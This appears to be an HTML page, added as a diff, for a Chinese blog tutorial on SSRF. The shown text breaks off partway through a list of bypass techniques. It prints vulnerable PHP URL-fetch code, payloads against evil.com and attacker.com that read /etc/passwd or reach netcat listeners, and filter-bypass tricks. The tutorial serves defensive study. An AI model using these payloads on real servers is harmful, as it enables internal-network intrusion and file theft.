@@ -1,0 +1,936 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2488174175014870" crossorigin="anonymous"></script><!-- google 广告 -->
+  <meta name="google-site-verification" content="40lMg4eqLLbXoDcpN3h-cEnfmselbQ8tUzNvuC0IRIs" /><!-- google 站点认证 -->
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lepeng">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1、SSRF 漏洞是什么？SSRF(Server Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 2、SSRF 漏洞原理SSRF 形成的原因大都是：由于服务端提供了能够从其他服务器应用获取数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞之 SSRF（Server-Side Request Forgery，服务器端请求伪造）">
+<meta property="og:url" content="https://flepeng.github.io/081-security-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E4%B9%8B-SSRF%EF%BC%88Server-Side-Request-Forgery%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89/index.html">
+<meta property="og:site_name" content="Lepeng">
+<meta property="og:description" content="1、SSRF 漏洞是什么？SSRF(Server Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 2、SSRF 漏洞原理SSRF 形成的原因大都是：由于服务端提供了能够从其他服务器应用获取数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-26858f669f0d7473189916736ef83feb.png">
+<meta property="og:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-8d6df85c13035afb7cc6d682042ab047.jpeg">
+<meta property="og:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-04c388120c0c9cf7711acc588893bc5e.png">
+<meta property="og:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-e6741845a67c587b411015a0260c47ef.png">
+<meta property="og:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-5c926f4d1866f77d81fd0d6c05783134.png">
+<meta property="article:published_time" content="2021-03-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-03T10:25:30.411Z">
+<meta property="article:author" content="Feng Lepeng">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://flepeng.github.io/img/security/ssrf/1726310019-26858f669f0d7473189916736ef83feb.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>漏洞之 SSRF（Server-Side Request Forgery，服务器端请求伪造） - Lepeng</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"flepeng.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"f3d259b9efd9ce8655c180fd01bf0045","google":{"measurement_id":"G-LFTE4C7W3W"},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?f3d259b9efd9ce8655c180fd01bf0045";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-LFTE4C7W3W", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-LFTE4C7W3W');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Lepeng 的 blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞之 SSRF（Server-Side Request Forgery，服务器端请求伪造）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-03-08 00:00" pubdate>
+          2021年3月8日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">漏洞之 SSRF（Server-Side Request Forgery，服务器端请求伪造）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1、SSRF-漏洞是什么？"><a href="#1、SSRF-漏洞是什么？" class="headerlink" title="1、SSRF 漏洞是什么？"></a>1、SSRF 漏洞是什么？</h2><p>SSRF(Server Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<h2 id="2、SSRF-漏洞原理"><a href="#2、SSRF-漏洞原理" class="headerlink" title="2、SSRF 漏洞原理"></a>2、SSRF 漏洞原理</h2><p>SSRF 形成的原因大都是：由于服务端提供了能够从其他服务器应用获取数据的功能（比如从指定的URL地址获取网页内容，加载指定地址的图片、数据、下载等等），且没有对目标地址做过滤与限制。  </p>
+<p><img src="/img/security/ssrf/1726310019-26858f669f0d7473189916736ef83feb.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般情况下，我们服务端请求的目标都是与该请求服务器处于同一内网的资源服务，但是如果没有对这个请求的目标地址、文件等做充足的过滤和限制，攻击者可通过篡改这个请求的目标地址来进行伪造请求。</p>
+<h2 id="3、SSRF-漏洞出现点"><a href="#3、SSRF-漏洞出现点" class="headerlink" title="3、SSRF 漏洞出现点"></a>3、SSRF 漏洞出现点</h2><ol>
+<li><p>分享：通过URL地址分享网页内容<br><img src="/img/security/ssrf/1726310019-8d6df85c13035afb7cc6d682042ab047.jpeg" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
+</li>
+<li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。<br><img src="/img/security/ssrf/1726310019-04c388120c0c9cf7711acc588893bc5e.png" srcset="/img/loading.gif" lazyload>  </p>
+</li>
+<li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
+<p>如：<a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de" target="_blank" rel="noopener">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+</li>
+<li><p>未公开的 api 实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。<br><img src="/img/security/ssrf/1726310019-e6741845a67c587b411015a0260c47ef.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
+</li>
+</ol>
+<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
+<ol start="7">
+<li><p>从URL关键字中寻找  </p>
+<p>利用 google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</p>
+<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
+</li>
+</ol>
+<h2 id="4、产生-SSRF-漏洞的-PHP-函数"><a href="#4、产生-SSRF-漏洞的-PHP-函数" class="headerlink" title="4、产生 SSRF 漏洞的 PHP 函数"></a>4、产生 SSRF 漏洞的 PHP 函数</h2><p>SSRF 攻击可能存在任何语言编写的应用，接下来将举例 php 中可能存在SSRF漏洞的函数。</p>
+<h3 id="1、file-get-contents"><a href="#1、file-get-contents" class="headerlink" title="1、file_get_contents()"></a>1、<code>file_get_contents()</code></h3><p>下面的代码使用 <code>file_get_contents</code> 函数从用户指定的 url 获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'url'</span>])) <br>&#123; <br>    $content = file_get_contents($_POST[<span class="hljs-string">'url'</span>]); <br>    $filename =<span class="hljs-string">'./images/'</span>.rand().<span class="hljs-string">';img1.jpg'</span>; <br>    file_put_contents($filename, $content); <br>    <span class="hljs-keyword">echo</span> $_POST[<span class="hljs-string">'url'</span>]; <br>    $img = <span class="hljs-string">"&lt;img src=\""</span>.$filename.<span class="hljs-string">"\"/&gt;"</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> $img; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="2、sockopen"><a href="#2、sockopen" class="headerlink" title="2、sockopen()"></a>2、<code>sockopen()</code></h3><p>以下代码使用 fsockopen 函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span><span class="hljs-params">($host,$port,$link)</span> </span><br><span class="hljs-function"></span>&#123; <br>    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!$fp) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"$errstr (error number $errno) \n"</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        $out = <span class="hljs-string">"GET $link HTTP/1.1\r\n"</span>; <br>        $out .= <span class="hljs-string">"Host: $host\r\n"</span>; <br>        $out .= <span class="hljs-string">"Connection: Close\r\n\r\n"</span>; <br>        $out .= <span class="hljs-string">"\r\n"</span>; <br>        fwrite($fp, $out); <br>        $contents=<span class="hljs-string">''</span>; <br>        <span class="hljs-keyword">while</span> (!feof($fp)) &#123; <br>            $contents.= fgets($fp, <span class="hljs-number">1024</span>); <br>        &#125; <br>        fclose($fp); <br>        <span class="hljs-keyword">return</span> $contents; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="3、curl-exec"><a href="#3、curl-exec" class="headerlink" title="3、curl_exec()"></a>3、<code>curl_exec()</code></h3><p>curl 这是另一个非常常见的实现，它通过 PHP 获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'url'</span>]))<br>&#123;<br>$link = $_POST[<span class="hljs-string">'url'</span>];<br>$curlobj = curl_init();<br>curl_setopt($curlobj, CURLOPT_POST, <span class="hljs-number">0</span>);<br>curl_setopt($curlobj,CURLOPT_URL,$link);<br>curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>$result=curl_exec($curlobj);<br>curl_close($curlobj);<br> <br>$filename = <span class="hljs-string">'./curled/'</span>.rand().<span class="hljs-string">'.txt'</span>;<br>file_put_contents($filename, $result); <br><span class="hljs-keyword">echo</span> $result;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">一般情况下PHP不会开启fopen的gopher <span class="hljs-keyword">wrapper</span><br>file_get_contents的gopher协议不能URL编码<br>file_get_contents关于Gopher的<span class="hljs-number">302</span>跳转会出现bug，导致利用失败<br>curl/libcurl <span class="hljs-number">7.43</span> 上gopher协议存在bug(%<span class="hljs-number">00</span>截断) 经测试<span class="hljs-number">7.49</span> 可用<br>curl_exec() 默认不跟踪跳转，<br>file_get_contents() file_get_contents支持php://<span class="hljs-keyword">input</span>协议<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="5、SSRF-中-URL-的伪协议"><a href="#5、SSRF-中-URL-的伪协议" class="headerlink" title="5、SSRF 中 URL 的伪协议"></a>5、SSRF 中 URL 的伪协议</h2><p><strong>当我们发现 SSRF 漏洞后，首先要做的事情就是测试所有可用的 URL 伪协议</strong></p>
+<ul>
+<li>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd  </li>
+<li>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：  </li>
+<li>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议  </li>
+<li>ldap:&#x2F;&#x2F; 轻量级目录访问协议  </li>
+<li>tftp:&#x2F;&#x2F; 简单文件传输协议  </li>
+<li>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</li>
+</ul>
+<h3 id="1、file"><a href="#1、file" class="headerlink" title="1、file"></a>1、file</h3><p>这种 URL Schema 可以尝试从文件系统中获取文件：</p>
+<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini" target="_blank" rel="noopener">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+<p>如果该服务器阻止对外部站点发送 HTTP 请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<h3 id="2、dict"><a href="#2、dict" class="headerlink" title="2、dict"></a>2、dict</h3><p>这种 URL Scheme 能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?dict://evil.com:1337/" target="_blank" rel="noopener">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p>
+</blockquote>
+<h3 id="3、sftp"><a href="#3、sftp" class="headerlink" title="3、sftp"></a>3、sftp</h3><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/" target="_blank" rel="noopener">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p>
+</blockquote>
+<h3 id="4、ldap-x2F-x2F-或ldaps-x2F-x2F-或-ldapi-x2F-x2F"><a href="#4、ldap-x2F-x2F-或ldaps-x2F-x2F-或-ldapi-x2F-x2F" class="headerlink" title="4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或 ldapi:&#x2F;&#x2F;"></a>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或 ldapi:&#x2F;&#x2F;</h3><p>LDAP 代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit" target="_blank" rel="noopener">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a></p>
+</blockquote>
+<h3 id="5、tftp-x2F-x2F"><a href="#5、tftp-x2F-x2F" class="headerlink" title="5、tftp:&#x2F;&#x2F;"></a>5、tftp:&#x2F;&#x2F;</h3><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET" target="_blank" rel="noopener">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a><br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
+</blockquote>
+<h3 id="6、gopher-x2F-x2F"><a href="#6、gopher-x2F-x2F" class="headerlink" title="6、gopher:&#x2F;&#x2F;"></a>6、gopher:&#x2F;&#x2F;</h3><p>Gopher 是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php" target="_blank" rel="noopener">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/\_Hi%0Assrf%0Atest');?><br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p>
+</blockquote>
+<h2 id="6、SSRF-漏洞利用（危害）"><a href="#6、SSRF-漏洞利用（危害）" class="headerlink" title="6、SSRF 漏洞利用（危害）"></a>6、SSRF 漏洞利用（危害）</h2><ol>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息;</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
+<li>对内网web应用进行指纹识别，通过访问默认文件实现;</li>
+<li>攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如struts2，sqli等）;</li>
+<li>利用 file 协议读取本地文件等。.</li>
+<li>各个协议调用探针：http，file，dict，ftp，gopher等<ul>
+<li>http:192.168.64.144&#x2F;phpmyadmin&#x2F;  </li>
+<li>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/" target="_blank" rel="noopener">www.txt</a>  </li>
+<li>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info  </li>
+<li><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></li>
+</ul>
+</li>
+<li>DOS攻击（请求大文件，始终保持连接keep alive always）等等</li>
+</ol>
+<h2 id="7、SSRF-漏洞绕过方式"><a href="#7、SSRF-漏洞绕过方式" class="headerlink" title="7、SSRF 漏洞绕过方式"></a>7、SSRF 漏洞绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到 SSRF 的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
+<p><strong>一、常见的绕过方式</strong></p>
+<p><strong>1、限制为 <a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<blockquote>
+<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/" target="_blank" rel="noopener">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./" target="_blank" rel="noopener">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
+</blockquote>
+<p><strong>2.采用短网址绕过</strong></p>
+<blockquote>
+<p>比如百度短地址<a href="https://dwz.cn/" target="_blank" rel="noopener">https://dwz.cn/</a></p>
+</blockquote>
+<p><strong>3.采用进制转换</strong></p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p><img src="/img/security/ssrf/1726310019-5c926f4d1866f77d81fd0d6c05783134.png" srcset="/img/loading.gif" lazyload>  </p>
+<p><strong>4.利用特殊域名</strong></p>
+<blockquote>
+<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p><strong>5.利用<code>[::]</code></strong></p>
+<blockquote>
+<p>可以利用<code>[::]</code>来绕过localhost<br><a href="http://169.254.169.254>>http://\[::169.254.169.254\]">http://169.254.169.254&gt;&gt;http://\[::169.254.169.254\]</a></p>
+</blockquote>
+<p><strong>6.利用句号</strong></p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p><strong>7、CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a<br></code></pre></td></tr></table></figure>
+
+<p><strong>8.利用封闭的字母数字</strong></p>
+<blockquote>
